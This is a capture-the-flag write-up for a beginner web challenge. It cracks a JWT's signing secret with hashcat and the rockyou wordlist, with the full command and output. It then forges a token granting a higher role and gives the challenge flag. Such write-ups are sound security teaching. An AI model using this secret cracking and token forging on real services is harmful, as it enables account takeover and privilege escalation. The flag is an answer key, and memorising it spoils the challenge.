# Challenge
Beginner/Secret-of-Kurama
h4l0gen
175 solves / 374 points
Madara attacked leaf village. everyone wants Naruto to turn into Nine-Tails, Naruto don't know what's the SECRET to change its role to 'NineTails'? can you as a shinobi help Naruto??? username: Naruto Password: Chakra
http://34.132.132.69:8004/

# Solution
Textbook jwt bruteforce.
Once logged in, there is a jwt cookie with value: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ik5hcnV0byIsInJvbGUiOiJzaGlub2JpIn0.WJv_YcVsRV15PqzGpq10-w5i2mJ_BI1mBzkZMtAPnIQ`

Using `jwt.io` it decodes to:
```
{
  "username": "Naruto",
  "role": "shinobi"
}
```

Use hashcat to crack the secret:
```
$ echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ik5hcnV0byIsInJvbGUiOiJzaGlub2JpIn0.WJv_YcVsRV15PqzGpq10-w5i2mJ_BI1mBzkZMtAPnIQ" > jwt.txt
                                                                                                                            
% hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt  
hashcat (v6.2.5) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-9700K CPU @ 3.60GHz, 2917/5899 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ik5hcnV0byIsInJvbGUiOiJzaGlub2JpIn0.WJv_YcVsRV15PqzGpq10-w5i2mJ_BI1mBzkZMtAPnIQ:minato
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 16500 (JWT (JSON Web Token))
Hash.Target......: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZS...tAPnIQ
Time.Started.....: Mon Dec 18 05:53:45 2023 (0 secs)
Time.Estimated...: Mon Dec 18 05:53:45 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1184.0 kH/s (0.81ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 114688/14344385 (0.80%)
Rejected.........: 0/114688 (0.00%)
Restore.Point....: 110592/14344385 (0.77%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: munster1 -> 022593
Hardware.Mon.#1..: Util: 14%

Started: Mon Dec 18 05:53:22 2023
Stopped: Mon Dec 18 05:53:46 2023

```

Secret is `minato`. Again, using `jwt.io`, place in the signature the value `minato` and change the payload to:
```
{
  "username": "Naruto",
  "role": "NineTails"
}
```
The resulting value is: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ik5hcnV0byIsInJvbGUiOiJOaW5lVGFpbHMifQ.rDZ26ZE_F4l0Ve4E-2sKP4qKNuadhLU8nrThW7YGVPg`. Change the cookie with this value and visit the http://34.132.132.69:8004/secret_of_Kurama link. 


Flag: flag{y0u_ar3_tru3_L34F_sh1n0b1_bf56gtr59894}